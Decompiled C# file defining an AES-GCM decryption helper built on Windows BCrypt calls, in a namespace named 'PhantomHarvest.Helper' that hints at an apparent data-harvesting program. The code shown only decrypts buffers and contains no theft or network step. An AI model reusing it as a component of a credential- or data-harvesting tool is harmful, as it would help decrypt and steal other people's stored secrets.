using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace PhantomHarvest.Helper
{
	// Token: 0x0200001D RID: 29
	internal class AesGcm
	{
		// Token: 0x06000085 RID: 133 RVA: 0x00006E80 File Offset: 0x00005080
		public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
		{
			IntPtr intPtr = this.OpenAlgorithmProvider(Win32Api.BCRYPT_AES_ALGORITHM, Win32Api.MS_PRIMITIVE_PROVIDER, Win32Api.BCRYPT_CHAIN_MODE_GCM);
			IntPtr hKey;
			IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
			Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
			byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
			int num = 0;
			uint num2 = Win32Api.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptDecrypt() (get size) failed with status code: {0}", num2));
			}
			byte[] array2 = new byte[num];
			num2 = Win32Api.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
			if (num2 == Win32Api.STATUS_AUTH_TAG_MISMATCH)
			{
				throw new CryptographicException("Win32Api.BCryptDecrypt(): authentication tag mismatch");
			}
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptDecrypt() failed with status code:{0}", num2));
			}
			bcrypt_AUTHENTICATED_CIPHER_MODE_INFO.Dispose();
			Win32Api.BCryptDestroyKey(hKey);
			Marshal.FreeHGlobal(hglobal);
			Win32Api.BCryptCloseAlgorithmProvider(intPtr, 0U);
			return array2;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00006F70 File Offset: 0x00005170
		private int MaxAuthTagSize(IntPtr hAlg)
		{
			byte[] property = this.GetProperty(hAlg, Win32Api.BCRYPT_AUTH_TAG_LENGTH);
			return BitConverter.ToInt32(new byte[]
			{
				property[4],
				property[5],
				property[6],
				property[7]
			}, 0);
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00006FB0 File Offset: 0x000051B0
		private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
		{
			IntPtr intPtr;
			uint num = Win32Api.BCryptOpenAlgorithmProvider(out intPtr, alg, provider, 0U);
			if (num != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptOpenAlgorithmProvider() failed with status code:{0}", num));
			}
			byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
			num = Win32Api.BCryptSetAlgorithmProperty(intPtr, Win32Api.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
			if (num != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptSetAlgorithmProperty(Win32Api.BCRYPT_CHAINING_MODE, Win32Api.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", num));
			}
			return intPtr;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00007018 File Offset: 0x00005218
		private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
		{
			int num = BitConverter.ToInt32(this.GetProperty(hAlg, Win32Api.BCRYPT_OBJECT_LENGTH), 0);
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			byte[] array = this.Concat(new byte[][]
			{
				Win32Api.BCRYPT_KEY_DATA_BLOB_MAGIC,
				BitConverter.GetBytes(1),
				BitConverter.GetBytes(key.Length),
				key
			});
			uint num2 = Win32Api.BCryptImportKey(hAlg, IntPtr.Zero, Win32Api.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptImportKey() failed with status code:{0}", num2));
			}
			return intPtr;
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000070A0 File Offset: 0x000052A0
		private byte[] GetProperty(IntPtr hAlg, string name)
		{
			int num = 0;
			uint num2 = Win32Api.BCryptGetProperty(hAlg, name, null, 0, ref num, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptGetProperty() (get size) failed with status code:{0}", num2));
			}
			byte[] array = new byte[num];
			num2 = Win32Api.BCryptGetProperty(hAlg, name, array, array.Length, ref num, 0U);
			if (num2 != 0U)
			{
				throw new CryptographicException(string.Format("Win32Api.BCryptGetProperty() failed with status code:{0}", num2));
			}
			return array;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00007108 File Offset: 0x00005308
		public byte[] Concat(params byte[][] arrays)
		{
			int num = 0;
			foreach (byte[] array in arrays)
			{
				if (array != null)
				{
					num += array.Length;
				}
			}
			byte[] array2 = new byte[num - 1 + 1];
			int num2 = 0;
			foreach (byte[] array3 in arrays)
			{
				if (array3 != null)
				{
					Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
					num2 += array3.Length;
				}
			}
			return array2;
		}
	}
}
